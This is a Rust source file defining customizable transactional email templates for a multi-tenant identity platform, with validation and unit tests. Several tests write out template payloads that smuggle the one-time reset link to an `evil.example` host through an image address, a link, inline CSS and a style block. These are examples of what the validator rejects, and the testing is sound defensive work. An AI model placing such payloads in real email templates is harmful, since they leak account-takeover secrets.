use crate::domains::branding::control::BrandingControl;
use crate::domains::branding::events::{BrandingPart, BrandingUpdated};
use crate::domains::branding::placeholders::{
    ensure_link_outside_markup, ensure_link_stands_alone, ensure_no_form_elements, ensure_no_link,
    ensure_only_placeholders,
};
use crate::domains::branding::styles::ensure_styles_cannot_read_link;
pub use crate::domains::branding::template_locale::{TemplateLocale, TemplateSlot, template_for};
use crate::isolation::scope::ResolvedTenant;
use crate::shared::errors::DomainError;
use crate::shared::events::event::DomainEvent;
use crate::shared::events::raised::{Raised, Raises, SavedFor};
use crate::shared::model::row_check::RowCheck;
use crate::shared::validation::{TextValue, Validator, text_value};
use crate::types::{Label, Preference};

/// The type of transactional email the template is for.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[cfg_attr(feature = "serde", derive(serde::Serialize, serde::Deserialize))]
pub enum EmailTemplateType {
    /// Email verification after registration.
    Verification,
    /// Password reset request.
    PasswordReset,
    /// Magic link login.
    MagicLink,
    /// Admin invitation to join the tenant.
    Invitation,
    /// Account locked notification.
    AccountLocked,
    /// MFA enrollment confirmation.
    MfaEnrolled,
    /// Recovery codes were generated.
    RecoveryCodes,
    /// A new device was trusted for the account.
    DeviceTrusted,
    /// Session was suspended due to suspicious activity.
    SessionSuspended,
    /// The user's password was found in a breach and should be changed.
    BreachedPassword,
    /// Confirms that a data erasure request was received.
    ErasureConfirmation,
    /// Data erasure completed.
    ErasureCompleted,
    /// Welcome email after account activation.
    Welcome,
    /// Verification code sent to a new address during an email change.
    EmailChangeVerification,
    /// Notification to the old address that the email address was changed.
    EmailChanged,
    /// Warning to the current address that someone asked to move the
    /// account to another one, with a link that stops it.
    ///
    /// Sent when the change is asked for, not when it lands: whoever took
    /// over a session asks for a move to their own address, and the owner
    /// stops it from the address they still hold.
    EmailChangeRequested,
    /// The account was linked to an external identity provider, which can
    /// now sign it in.
    AccountLinked,
    /// A one-time code mailed for a second factor, typed back to sign in or
    /// to confirm the factor being set up.
    SignInCode,
    /// A person's copy of what is kept about them is ready, to download
    /// after signing in until the window closes. The mail carries no link
    /// that downloads it.
    ExportReady,
    /// A tenant admin asked to act as the person for support, with why;
    /// the person approves or declines from their own sign-in.
    ImpersonationRequested,

    //
    // Org users belong to no tenant, so their mail names the organization
    // where a tenant message names the tenant and the role. Separate types
    // rather than one template branching on which name it was handed: the
    // copy differs beyond the noun, and a template that has to guess which
    // plane sent it is a template nobody can safely edit.
    /// Verify an org user's address, for an account an admin created.
    OrgVerification,
    /// Invite someone to an organization.
    OrgInvitation,
    /// An org user's account is ready to sign into.
    OrgWelcome,
    /// An owner reset the org user's second factor.
    OrgMfaReset,
    /// Warning to an org user's current address that someone asked to move
    /// the account to another one, with a link that stops it.
    OrgEmailChangeRequested,

    /// Verify the founder's address so their organization can be created.
    SignupVerification,
    /// The organization exists and the founder can sign in.
    SignupWelcome,
    /// Someone asked to sign up with an address that has an account
    /// already: a pointer to signing in instead.
    SignupAccountExists,

    /// An invited or admin-created user finished activating and can sign in.
    /// Distinct from [`Self::Welcome`], which greets someone whose account was
    /// ready the moment it was made.
    ActivationWelcome,

    /// Something happened that the person is told of in the app, mailed as
    /// well because they chose to have its kind by mail. It carries the
    /// notification's own title and text, nothing more.
    ActivityNotice,
}

/// A value the mailer can fill into an email template at send time.
///
/// Each template type gets its own set, listed by
/// [`EmailTemplateType::available_variables`].
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[cfg_attr(feature = "serde", derive(serde::Serialize, serde::Deserialize))]
pub enum TemplateVariable {
    /// The user's display name.
    UserName,
    /// The user's email address.
    UserEmail,
    /// The tenant's display name.
    TenantName,
    /// The organization's display name, the company that owns the tenant.
    ///
    /// Org users belong to no tenant, so this is the only name their emails
    /// have.
    OrganizationName,
    /// The bare action address, such as a verification, reset or magic link.
    ///
    /// Only the platform's own templates receive it, because it carries a
    /// one-time secret. Eve could put it in an image address on her own
    /// server. Every reset link would reach her as soon as the mail is opened.
    ActionUrl,
    /// The action as a finished link that the platform writes in full.
    ///
    /// A custom template places this where its link goes.
    ActionLink,
    /// When the link or token expires.
    ExpiresAt,
    /// The name of a trusted device.
    DeviceName,
    /// IP address of the request.
    IpAddress,
    /// Number of remaining recovery codes.
    RemainingCodes,
    /// The scheduled erasure date.
    ErasureDate,
    /// The name of a role granted to the user.
    RoleName,
    /// The name of an external identity provider (e.g. `Okta`).
    ProviderName,
    /// A one-time code the person types back.
    ///
    /// Like the link, it is a secret: a tenant's own template may show it
    /// only in readable text, never in a subject, a tag or an attribute.
    OneTimeCode,
    /// The display name of the person who asked for something on the
    /// recipient's account, such as an admin asking to act as them.
    RequesterName,
    /// Why it was asked for, in the requester's words.
    Reason,
    /// The title of the notification a mail repeats.
    NoticeTitle,
    /// The text of the notification a mail repeats, or its title again
    /// when it has none.
    NoticeBody,
    /// The current calendar year (for copyright footers).
    Year,
}

impl TemplateVariable {
    /// The `snake_case` placeholder key used in template bodies.
    ///
    /// For example, `UserName` fills `{{ user_name }}`. Every other mapping
    /// from variant to placeholder reads from here.
    #[must_use]
    pub fn key(&self) -> &'static str {
        match self {
            Self::UserName => "user_name",
            Self::UserEmail => "user_email",
            Self::TenantName => "tenant_name",
            Self::OrganizationName => "organization_name",
            Self::ActionUrl => "action_url",
            Self::ActionLink => "action_link",
            Self::ExpiresAt => "expires_at",
            Self::DeviceName => "device_name",
            Self::IpAddress => "ip_address",
            Self::RemainingCodes => "remaining_codes",
            Self::ErasureDate => "erasure_date",
            Self::RoleName => "role_name",
            Self::ProviderName => "provider_name",
            Self::OneTimeCode => "one_time_code",
            Self::RequesterName => "requester_name",
            Self::Reason => "reason",
            Self::NoticeTitle => "notice_title",
            Self::NoticeBody => "notice_body",
            Self::Year => "year",
        }
    }
}

impl EmailTemplateType {
    /// The type's name, as it is stored and recorded.
    // One arm per type, with no catch-all: a new type must be named here
    // before it builds. Splitting it would bring a catch-all back.
    #[allow(clippy::too_many_lines)]
    #[must_use]
    pub fn name(self) -> &'static str {
        match self {
            Self::Verification => "Verification",
            Self::PasswordReset => "PasswordReset",
            Self::MagicLink => "MagicLink",
            Self::Invitation => "Invitation",
            Self::AccountLocked => "AccountLocked",
            Self::MfaEnrolled => "MfaEnrolled",
            Self::RecoveryCodes => "RecoveryCodes",
            Self::DeviceTrusted => "DeviceTrusted",
            Self::SessionSuspended => "SessionSuspended",
            Self::BreachedPassword => "BreachedPassword",
            Self::ErasureConfirmation => "ErasureConfirmation",
            Self::ErasureCompleted => "ErasureCompleted",
            Self::Welcome => "Welcome",
            Self::EmailChangeVerification => "EmailChangeVerification",
            Self::EmailChanged => "EmailChanged",
            Self::EmailChangeRequested => "EmailChangeRequested",
            Self::AccountLinked => "AccountLinked",
            Self::SignInCode => "SignInCode",
            Self::ExportReady => "ExportReady",
            Self::ImpersonationRequested => "ImpersonationRequested",
            Self::OrgVerification => "OrgVerification",
            Self::OrgInvitation => "OrgInvitation",
            Self::OrgWelcome => "OrgWelcome",
            Self::OrgMfaReset => "OrgMfaReset",
            Self::OrgEmailChangeRequested => "OrgEmailChangeRequested",
            Self::SignupVerification => "SignupVerification",
            Self::SignupWelcome => "SignupWelcome",
            Self::SignupAccountExists => "SignupAccountExists",
            Self::ActivationWelcome => "ActivationWelcome",
            Self::ActivityNotice => "ActivityNotice",
        }
    }

    /// The placeholder variables a template of this type can receive at
    /// send time.
    ///
    /// A tenant's own template is held to
    /// [`custom_variables`](Self::custom_variables) instead, which swaps the
    /// bare link address for the finished link.
    #[must_use]
    pub fn available_variables(&self) -> &'static [TemplateVariable] {
        match self {
            Self::Verification | Self::MagicLink => variables::TENANT_LINK,
            Self::PasswordReset => variables::PASSWORD_RESET,
            Self::Invitation => variables::INVITATION,
            Self::AccountLocked | Self::SessionSuspended => variables::SECURITY_ALERT,
            Self::MfaEnrolled | Self::ErasureCompleted => variables::TENANT_NOTICE,
            Self::RecoveryCodes => variables::RECOVERY_CODES,
            Self::DeviceTrusted => variables::DEVICE_TRUSTED,
            Self::BreachedPassword => variables::BREACHED_PASSWORD,
            Self::ErasureConfirmation => variables::ERASURE_CONFIRMATION,
            Self::Welcome => variables::WELCOME,
            Self::EmailChangeVerification => variables::EMAIL_CHANGE_VERIFICATION,
            Self::EmailChanged => variables::EMAIL_CHANGED,
            Self::EmailChangeRequested => variables::EMAIL_CHANGE_REQUESTED,
            Self::AccountLinked => variables::ACCOUNT_LINKED,
            Self::SignInCode => variables::SIGN_IN_CODE,
            Self::ExportReady => variables::EXPORT_READY,
            Self::ImpersonationRequested => variables::IMPERSONATION_REQUESTED,
            Self::SignupVerification | Self::OrgVerification => variables::ORGANIZATION_LINK,
            Self::OrgInvitation => variables::ORG_INVITATION,
            Self::SignupWelcome | Self::OrgWelcome => variables::ORGANIZATION_WELCOME,
            Self::SignupAccountExists => variables::ACCOUNT_EXISTS,
            Self::OrgMfaReset => variables::ORGANIZATION_NOTICE,
            Self::OrgEmailChangeRequested => variables::ORG_EMAIL_CHANGE_REQUESTED,
            Self::ActivationWelcome => variables::ACTIVATION_WELCOME,
            Self::ActivityNotice => variables::ACTIVITY_NOTICE,
        }
    }

    /// The placeholder variables a tenant's own template of this type can use.
    ///
    /// They are the platform's set with [`TemplateVariable::ActionUrl`]
    /// swapped for [`TemplateVariable::ActionLink`].
    #[must_use]
    pub fn custom_variables(self) -> Vec<TemplateVariable> {
        self.available_variables()
            .iter()
            .map(|&variable| {
                if variable == TemplateVariable::ActionUrl {
                    return TemplateVariable::ActionLink;
                }
                variable
            })
            .collect()
    }
}

/// The placeholder sets templates receive, shared where templates take the
/// same ones.
mod variables {
    use crate::domains::branding::email_template::TemplateVariable;
    use crate::domains::branding::email_template::TemplateVariable::{
        ActionUrl, DeviceName, ErasureDate, ExpiresAt, IpAddress, NoticeBody, NoticeTitle,
        OneTimeCode, OrganizationName, ProviderName, Reason, RemainingCodes, RequesterName,
        RoleName, TenantName, UserEmail, UserName,
    };

    type Set = &'static [TemplateVariable];

    pub(super) const TENANT_LINK: Set = &[UserName, TenantName, ActionUrl, ExpiresAt];
    pub(super) const PASSWORD_RESET: Set = &[UserName, TenantName, ActionUrl, ExpiresAt, IpAddress];
    pub(super) const INVITATION: Set = &[
        UserName, UserEmail, TenantName, ActionUrl, ExpiresAt, RoleName,
    ];
    pub(super) const SECURITY_ALERT: Set = &[UserName, TenantName, IpAddress];
    pub(super) const TENANT_NOTICE: Set = &[UserName, TenantName];
    pub(super) const RECOVERY_CODES: Set = &[UserName, TenantName, RemainingCodes];
    pub(super) const DEVICE_TRUSTED: Set = &[UserName, TenantName, DeviceName, IpAddress];
    pub(super) const BREACHED_PASSWORD: Set = &[UserName, TenantName, ActionUrl];
    pub(super) const ERASURE_CONFIRMATION: Set = &[UserName, TenantName, ErasureDate, ActionUrl];
    pub(super) const WELCOME: Set = &[UserName, TenantName, RoleName, ActionUrl];
    pub(super) const EMAIL_CHANGE_VERIFICATION: Set = &[UserName, UserEmail, ActionUrl, ExpiresAt];
    pub(super) const EMAIL_CHANGED: Set = &[UserEmail];
    pub(super) const EMAIL_CHANGE_REQUESTED: Set = &[
        UserName, UserEmail, TenantName, ActionUrl, ExpiresAt, IpAddress,
    ];
    pub(super) const ORG_EMAIL_CHANGE_REQUESTED: Set = &[
        UserName,
        UserEmail,
        OrganizationName,
        ActionUrl,
        ExpiresAt,
        IpAddress,
    ];
    pub(super) const ACCOUNT_LINKED: Set = &[UserName, TenantName, ProviderName, IpAddress];
    pub(super) const SIGN_IN_CODE: Set = &[UserName, TenantName, OneTimeCode, ExpiresAt];
    pub(super) const EXPORT_READY: Set = &[UserName, TenantName, ExpiresAt];
    pub(super) const IMPERSONATION_REQUESTED: Set =
        &[UserName, TenantName, RequesterName, Reason, ExpiresAt];
    pub(super) const ORGANIZATION_LINK: Set = &[UserName, OrganizationName, ActionUrl, ExpiresAt];
    pub(super) const ORG_INVITATION: Set =
        &[UserName, UserEmail, OrganizationName, ActionUrl, ExpiresAt];
    pub(super) const ORGANIZATION_WELCOME: Set = &[UserName, OrganizationName, ActionUrl];
    pub(super) const ORGANIZATION_NOTICE: Set = &[UserName, OrganizationName];
    pub(super) const ACCOUNT_EXISTS: Set = &[UserName, ActionUrl];
    pub(super) const ACTIVATION_WELCOME: Set = &[UserName, OrganizationName, TenantName, ActionUrl];
    pub(super) const ACTIVITY_NOTICE: Set = &[NoticeTitle, NoticeBody];
}

/// Maximum length for email subject lines.
///
/// Used by callers when constructing `Label::with_max_length`
/// for the subject field.
pub const MAX_SUBJECT_LENGTH: usize = 200;

/// Maximum length for email body content (HTML or plain text).
const MAX_BODY_LENGTH: usize = 65536;

/// A tenant's own version of one transactional email, in one language.
///
/// The tenant can replace the subject, the HTML body and the text body. Each
/// part left as inherited uses the platform's. Bodies may hold placeholders
/// like `{{ user_name }}` or `{{ action_link }}`, which the mailer fills at
/// send time. A tenant keeps one template per email and locale, and one for
/// every other locale; [`template_for`] picks the one a recipient gets.
///
/// It can be written to JSON but not read from it. [`custom`](Self::custom)
/// and [`reconstitute`](Self::reconstitute) are the only ways to build one,
/// so the placeholder check always runs.
#[derive(Debug, Clone)]
#[cfg_attr(feature = "serde", derive(serde::Serialize))]
pub struct EmailTemplate {
    /// Which email this template is for.
    template_type: EmailTemplateType,

    /// Which recipients it is written for.
    locale: TemplateLocale,

    /// The tenant's subject line, or the platform's.
    subject: Preference<Label>,

    /// The tenant's HTML body, or the platform's. Supports `{{variable}}`
    /// placeholders.
    body_html: Preference<EmailHtmlBody>,

    /// The tenant's plain-text body for clients that don't render HTML, or
    /// the platform's.
    body_text: Preference<EmailTextBody>,

    /// What writing or removing the template raised. The template is not
    /// typed by its tenant's scope, so the list takes the resolved one; the
    /// tenant stamped on each event is the one the save names either way.
    #[cfg_attr(feature = "serde", serde(skip))]
    raised: Raised<ResolvedTenant>,
}

/// Stored fields of an [`EmailTemplate`], read back by repositories.
pub struct EmailTemplateRow {
    /// Which email the template is for.
    pub template_type: EmailTemplateType,
    /// Which recipients it is written for.
    pub locale: TemplateLocale,
    /// The tenant's subject line, or the platform's.
    pub subject: Preference<Label>,
    /// The tenant's HTML body, or the platform's.
    pub body_html: Preference<EmailHtmlBody>,
    /// The tenant's plain-text body, or the platform's.
    pub body_text: Preference<EmailTextBody>,
}

impl EmailTemplate {
    /// Creates a tenant's template for one email type.
    ///
    /// It may hold only text and bare `{{ name }}` placeholders from the
    /// type's [`custom_variables`](EmailTemplateType::custom_variables). The
    /// link goes in as `{{ action_link }}`, which the platform writes in full.
    /// No filter, loop or lookup can take it apart.
    ///
    /// Eve may edit branding. Without this check she rewrites the reset email
    /// so its one-time link points at her own server.
    ///
    /// Raises `branding.updated`, naming the email.
    ///
    /// # Errors
    ///
    /// - [`DomainError::Forbidden`] when `by` may not change branding.
    /// - [`DomainError::Validation`] when the subject or a body holds template
    ///   code other than a placeholder this type fills.
    /// - [`DomainError::Validation`] when the link sits in the subject, inside
    ///   HTML markup, or glued to text before it in the text body.
    /// - [`DomainError::Validation`] when the HTML body holds a `form`,
    ///   `textarea`, `input`, `button`, `base`, `meta` or `iframe` tag.
    ///
    /// `slot` names the email and the recipients it is written for. An
    /// email type alone names the template for every locale without one of
    /// its own.
    pub fn custom(
        slot: impl Into<TemplateSlot>,
        subject: Preference<Label>,
        body_html: Preference<EmailHtmlBody>,
        body_text: Preference<EmailTextBody>,
        by: &BrandingControl<'_>,
    ) -> Result<Self, DomainError> {
        by.ensure_may_change()?;
        let TemplateSlot {
            template_type,
            locale,
        } = slot.into();
        let mut template = Self {
            template_type,
            locale,
            subject,
            body_html,
            body_text,
            raised: Raised::default(),
        };
        template.ensure_placeholders_fit()?;
        template.raise_changed();
        Ok(template)
    }

    /// Rebuilds a custom email template from storage.
    ///
    /// # Errors
    ///
    /// - [`DomainError::Infrastructure`] when the stored row breaks any rule
    ///   [`custom`](Self::custom) checks. A template written to storage
    ///   around those rules never reaches the mailer.
    pub fn reconstitute(row: EmailTemplateRow) -> Result<Self, DomainError> {
        let template = Self {
            template_type: row.template_type,
            locale: row.locale,
            subject: row.subject,
            body_html: row.body_html,
            body_text: row.body_text,
            raised: Raised::default(),
        };
        RowCheck::of("email template")
            .holds(
                template.ensure_placeholders_fit().is_ok(),
                "template code beyond the placeholders its type fills",
            )
            .finish()?;
        Ok(template)
    }

    /// Refuses a subject or body holding template code other than a bare
    /// placeholder this type fills, or the one-time link anywhere it could
    /// become part of an address the template's author chose. An HTML body
    /// may also hold no form, field, button, `base`, `meta`, frame or script,
    /// and, when it carries the link or a code, no style that could read it.
    fn ensure_placeholders_fit(&self) -> Result<(), DomainError> {
        let allowed = self.template_type.custom_variables();
        let subject = self.subject.value().map(Label::as_str);
        let html = self.body_html.value().map(EmailHtmlBody::as_str);
        let text = self.body_text.value().map(EmailTextBody::as_str);
        [subject, html, text]
            .into_iter()
            .flatten()
            .try_for_each(|part| ensure_only_placeholders(part, &allowed))?;
        subject.map_or(Ok(()), ensure_no_link)?;
        html.map_or(Ok(()), ensure_link_outside_markup)?;
        html.map_or(Ok(()), ensure_no_form_elements)?;
        html.map_or(Ok(()), ensure_styles_cannot_read_link)?;
        text.map_or(Ok(()), ensure_link_stands_alone)
    }

    /// The email type this template is for.
    #[must_use]
    pub fn template_type(&self) -> EmailTemplateType {
        self.template_type
    }

    /// Which recipients this template is written for.
    #[must_use]
    pub fn locale(&self) -> &TemplateLocale {
        &self.locale
    }

    /// The tenant's subject line, or that the platform's is sent.
    #[must_use]
    pub fn subject(&self) -> &Preference<Label> {
        &self.subject
    }

    /// The tenant's HTML body, or that the platform's is sent.
    #[must_use]
    pub fn body_html(&self) -> &Preference<EmailHtmlBody> {
        &self.body_html
    }

    /// The tenant's plain-text body, or that the platform's is sent.
    #[must_use]
    pub fn body_text(&self) -> &Preference<EmailTextBody> {
        &self.body_text
    }

    /// Whether any part of this template has been customized.
    #[must_use]
    pub fn has_customization(&self) -> bool {
        self.subject.value().is_some()
            || self.body_html.value().is_some()
            || self.body_text.value().is_some()
    }

    /// Removes this template, which sends the platform's mail in its place,
    /// once `by` may change branding. Raises `branding.updated`, naming the
    /// email, taken once the template is removed from storage.
    ///
    /// Sam may only view branding. Without this check, he throws away the
    /// welcome mail Acme wrote in its own words, and its customers get the
    /// platform's instead.
    ///
    /// # Errors
    ///
    /// - [`DomainError::Forbidden`] when `by` may not change branding.
    pub fn remove(&mut self, by: &BrandingControl<'_>) -> Result<(), DomainError> {
        by.ensure_may_change()?;
        self.raise_changed();
        Ok(())
    }

    /// Raises `branding.updated` naming this template's email. The record
    /// names the email, never what the template says.
    fn raise_changed(&mut self) {
        self.raised.raise(BrandingUpdated {
            part: BrandingPart::EmailTemplate(self.template_type),
            occurred_at: crate::shared::clock::now(),
        });
    }
}

impl Raises for EmailTemplate {
    fn take_events(&mut self, saved_for: &impl SavedFor) -> Vec<DomainEvent> {
        self.raised.take(saved_for)
    }
}

text_value! {
    /// The HTML body of a custom email template.
    pub struct EmailHtmlBody;
}

impl TextValue for EmailHtmlBody {
    const FIELD: &'static str = "email_body_html";

    fn rules(check: Validator<'_>) -> Validator<'_> {
        check.not_empty().char_length(1..=MAX_BODY_LENGTH)
    }
}

text_value! {
    /// The plain-text body of a custom email template, which may run over
    /// several lines.
    pub struct EmailTextBody;
}

impl TextValue for EmailTextBody {
    const FIELD: &'static str = "email_body_text";

    fn rules(check: Validator<'_>) -> Validator<'_> {
        check
            .not_empty()
            .char_length(1..=MAX_BODY_LENGTH)
            .no_control_chars_but_line_breaks()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::domains::authorization::permission::{BrandingAction, SystemPermission};
    use crate::shared::events::data::FieldValue;
    use crate::test_support::authority::anyone_holding;
    use crate::test_support::builders::label;
    use crate::test_support::events::{raised, raised_names};

    fn editor() -> BrandingControl<'static> {
        BrandingControl::new(anyone_holding(&[SystemPermission::Branding(
            BrandingAction::Update,
        )]))
    }

    fn html(body: &str) -> EmailHtmlBody {
        EmailHtmlBody::new(body).unwrap()
    }

    /// A caller with only the branding view right cannot create a reset
    /// template, even when its content uses an allowed link placeholder.
    #[test]
    fn a_viewer_may_not_write_a_template() {
        let viewer = BrandingControl::new(anyone_holding(&[SystemPermission::Branding(
            BrandingAction::View,
        )]));

        let written = EmailTemplate::custom(
            EmailTemplateType::PasswordReset,
            Preference::Own(subject("Reset your password")),
            Preference::Own(html("<p>Reset here: {{ action_link }}</p>")),
            Preference::Inherited,
            &viewer,
        );

        assert!(matches!(written, Err(DomainError::Forbidden(_))));
    }

    /// A branding viewer cannot remove the reset template; a caller with
    /// the update right can remove that same template afterward.
    #[test]
    fn only_someone_who_may_change_branding_removes_a_template() {
        let mut template = reset_mail();
        let viewer = BrandingControl::new(anyone_holding(&[SystemPermission::Branding(
            BrandingAction::View,
        )]));

        let by_viewer = template.remove(&viewer);
        let by_editor = template.remove(&editor());

        assert!(matches!(by_viewer, Err(DomainError::Forbidden(_))));
        assert!(by_editor.is_ok());
    }

    /// Acme's own password reset mail.
    fn reset_mail() -> EmailTemplate {
        EmailTemplate::custom(
            EmailTemplateType::PasswordReset,
            Preference::Own(subject("Reset your password")),
            Preference::Own(html("<p>Reset here: {{ action_link }}</p>")),
            Preference::Inherited,
            &editor(),
        )
        .unwrap()
    }

    /// The email a `branding.updated` record names.
    fn template_named(event: &DomainEvent) -> Option<String> {
        match event.payload().value("template") {
            Some(FieldValue::Text(name)) => Some(name.clone()),
            _ => None,
        }
    }

    /// Fay writes Acme's password reset mail and later removes it. Each is
    /// raised as `branding.updated`, naming the password reset email.
    #[test]
    fn writing_and_removing_a_template_raise_updates_naming_the_email() {
        let mut template = reset_mail();
        let written = raised(&mut template);

        template.remove(&editor()).unwrap();
        let removed = raised(&mut template);

        for events in [written, removed] {
            assert_eq!(events.len(), 1);
            assert_eq!(events[0].event_type().to_string(), "branding.updated");
            assert_eq!(
                template_named(&events[0]).as_deref(),
                Some(EmailTemplateType::PasswordReset.name())
            );
        }
    }

    /// Removing a reset template with only the view right is rejected
    /// without raising an event.
    #[test]
    fn a_refused_removal_raises_nothing() {
        let mut template = reset_mail();
        raised_names(&mut template);
        let viewer = BrandingControl::new(anyone_holding(&[SystemPermission::Branding(
            BrandingAction::View,
        )]));

        let removed = template.remove(&viewer);

        assert!(removed.is_err());
        assert!(raised_names(&mut template).is_empty());
    }

    /// A template read back from storage has raised nothing.
    #[test]
    fn a_template_read_back_from_storage_has_raised_nothing() {
        let mut stored = EmailTemplate::reconstitute(EmailTemplateRow {
            template_type: EmailTemplateType::PasswordReset,
            locale: TemplateLocale::Fallback,
            subject: Preference::Own(subject("Reset your password")),
            body_html: Preference::Inherited,
            body_text: Preference::Inherited,
        })
        .unwrap();

        assert!(raised_names(&mut stored).is_empty());
    }

    fn text(body: &str) -> EmailTextBody {
        EmailTextBody::new(body).unwrap()
    }

    fn subject(s: &str) -> Label {
        Label::with_max_length("email_subject", s, MAX_SUBJECT_LENGTH).unwrap()
    }

    /// A tenant writes its own subject, HTML body and text body for the
    /// verification email. All three are kept and the template counts as
    /// customized.
    #[test]
    fn creates_template_with_all_fields() {
        let tpl = EmailTemplate::custom(
            EmailTemplateType::Verification,
            Preference::Own(subject("Verify your email")),
            Preference::Own(html("<h1>Hello {{user_name}}</h1>")),
            Preference::Own(text("Hello {{user_name}}")),
            &editor(),
        )
        .unwrap();

        assert_eq!(tpl.template_type(), EmailTemplateType::Verification);
        assert_eq!(
            tpl.subject().value().map(Label::as_str),
            Some("Verify your email")
        );
        assert!(tpl.body_html().value().is_some());
        assert!(tpl.body_text().value().is_some());
        assert!(tpl.has_customization());
    }

    /// A tenant saves a reset template with every part inherited. It is
    /// accepted and does not count as customized.
    #[test]
    fn creates_template_with_no_overrides() {
        let tpl = EmailTemplate::custom(
            EmailTemplateType::PasswordReset,
            Preference::Inherited,
            Preference::Inherited,
            Preference::Inherited,
            &editor(),
        )
        .unwrap();

        assert!(!tpl.has_customization());
    }

    /// A tenant saves an empty HTML body. It is refused, so a blank body
    /// never replaces the platform's.
    #[test]
    fn rejects_empty_body_html() {
        assert!(EmailHtmlBody::new("").is_err());
    }

    /// A tenant saves an empty text body. It is refused, so readers without
    /// HTML never get a blank email.
    #[test]
    fn rejects_empty_body_text() {
        assert!(EmailTextBody::new("").is_err());
    }

    /// A text body holds a NUL byte between two words. It is refused.
    #[test]
    fn rejects_body_text_with_control_chars() {
        assert!(EmailTextBody::new("Hello\x00World").is_err());
    }

    /// An HTML body holds tags and a placeholder. The body type itself
    /// accepts the markup.
    #[test]
    fn accepts_html_body_with_angle_brackets() {
        assert!(EmailHtmlBody::new("<h1>Hello</h1><p>Welcome {{user_name}}</p>").is_ok());
    }

    /// A text body holds blank lines and a Windows line ending. Line breaks
    /// are not counted as control characters, so it is accepted.
    #[test]
    fn a_text_body_may_break_lines() {
        assert!(EmailTextBody::new("Hello,\n\nWelcome.\r\n").is_ok());
    }

    /// One template sets both bodies and another inherits them. The first
    /// gives back the exact text, the second reads as inherited.
    #[test]
    fn a_custom_template_hands_back_the_bodies_it_was_given() {
        let template = EmailTemplate::custom(
            EmailTemplateType::Verification,
            Preference::Own(subject("Verify your email")),
            Preference::Own(html("<p>Hello</p>")),
            Preference::Own(text("Hello")),
            &editor(),
        )
        .unwrap();

        assert_eq!(
            template.body_html().value().map(EmailHtmlBody::as_str),
            Some("<p>Hello</p>")
        );
        assert_eq!(
            template.body_text().value().map(EmailTextBody::as_str),
            Some("Hello")
        );

        let untouched = EmailTemplate::custom(
            EmailTemplateType::Verification,
            Preference::Inherited,
            Preference::Inherited,
            Preference::Inherited,
            &editor(),
        )
        .unwrap();
        assert_eq!(untouched.body_html(), &Preference::Inherited);
        assert_eq!(untouched.body_text(), &Preference::Inherited);
    }

    /// Changing only a verification email's subject counts as customization.
    #[test]
    fn any_single_customized_part_counts() {
        let subject_only = EmailTemplate::custom(
            EmailTemplateType::Verification,
            Preference::Own(subject("Verify your email")),
            Preference::Inherited,
            Preference::Inherited,
            &editor(),
        )
        .unwrap();
        assert!(subject_only.has_customization());
    }

    /// Changing only a verification email's HTML body counts as customization.
    #[test]
    fn a_custom_html_body_alone_counts_as_customization() {
        let html_only = EmailTemplate::custom(
            EmailTemplateType::Verification,
            Preference::Inherited,
            Preference::Own(html("<p>Hello</p>")),
            Preference::Inherited,
            &editor(),
        )
        .unwrap();
        assert!(html_only.has_customization());
    }

    /// Changing only a verification email's plain text counts as customization.
    #[test]
    fn a_custom_text_body_alone_counts_as_customization() {
        let text_only = EmailTemplate::custom(
            EmailTemplateType::Verification,
            Preference::Inherited,
            Preference::Inherited,
            Preference::Own(text("Hello")),
            &editor(),
        )
        .unwrap();
        assert!(text_only.has_customization());
    }

    /// Inheriting every verification email part leaves it without customization.
    #[test]
    fn an_inherited_verification_email_has_no_customization() {
        assert!(
            !EmailTemplate::custom(
                EmailTemplateType::Verification,
                Preference::Inherited,
                Preference::Inherited,
                Preference::Inherited,
                &editor(),
            )
            .unwrap()
            .has_customization()
        );
    }

    /// Custom templates reject the bare action URL placeholder in an HTML
    /// image address, a text body and a subject line.
    #[test]
    fn a_custom_template_cannot_place_the_link_address_itself() {
        let leak = html(r#"<img src="https://evil.example/c?u={{ action_url | urlencode }}">"#);

        let in_html = EmailTemplate::custom(
            EmailTemplateType::PasswordReset,
            Preference::Inherited,
            Preference::Own(leak),
            Preference::Inherited,
            &editor(),
        );
        let in_text = EmailTemplate::custom(
            EmailTemplateType::MagicLink,
            Preference::Inherited,
            Preference::Inherited,
            Preference::Own(text("Go to {{action_url}}")),
            &editor(),
        );
        let in_subject = EmailTemplate::custom(
            EmailTemplateType::Verification,
            Preference::Own(subject("{{ action_url }}")),
            Preference::Inherited,
            Preference::Inherited,
            &editor(),
        );

        for result in [in_html, in_text, in_subject] {
            assert!(matches!(result, Err(DomainError::Validation(_))));
        }
    }

    /// A stored reset template that filters its action link is rejected
    /// as corrupt during reconstitution.
    #[test]
    fn a_stored_template_with_template_code_is_refused() {
        let stored = EmailTemplate::reconstitute(EmailTemplateRow {
            template_type: EmailTemplateType::PasswordReset,
            locale: TemplateLocale::Fallback,
            subject: Preference::Inherited,
            body_html: Preference::Own(html("{{ action_link | replace('https', 'http') }}")),
            body_text: Preference::Inherited,
        });

        assert!(crate::shared::model::row_check::refused_as_corrupt(&stored));
    }

    /// A tenant's reset email puts `{{ action_link }}` in a paragraph. It is
    /// accepted, so a custom template can still carry the link.
    #[test]
    fn a_custom_template_places_the_finished_link() {
        let template = EmailTemplate::custom(
            EmailTemplateType::PasswordReset,
            Preference::Inherited,
            Preference::Own(html("<p>Reset here: {{ action_link }}</p>")),
            Preference::Inherited,
            &editor(),
        );

        assert!(template.is_ok());
    }

    fn reset_with(
        subject: Preference<Label>,
        body_html: Preference<EmailHtmlBody>,
        body_text: Preference<EmailTextBody>,
    ) -> Result<EmailTemplate, DomainError> {
        EmailTemplate::custom(
            EmailTemplateType::PasswordReset,
            subject,
            body_html,
            body_text,
            &editor(),
        )
    }

    /// Even a branding editor cannot put the action link in HTML addresses
    /// or styles, append it to another URL in text, or include it in a subject.
    #[test]
    fn the_link_cannot_be_placed_where_it_becomes_part_of_another_address() {
        let html_attacks = [
            "<img src='https://evil.example/c?{{ action_link }}'>",
            "<a href=\"https://evil.example/?{{ action_link }}\">Reset</a>",
            "<p style=\"background:url(https://evil.example/{{ action_link }})\">x</p>",
            "<style>p { background: url(https://evil.example/{{ action_link }}) }</style>",
        ];
        for body in html_attacks {
            let result = reset_with(
                Preference::Inherited,
                Preference::Own(html(body)),
                Preference::Inherited,
            );
            assert!(
                matches!(result, Err(DomainError::Validation(_))),
                "{body:?} was accepted"
            );
        }

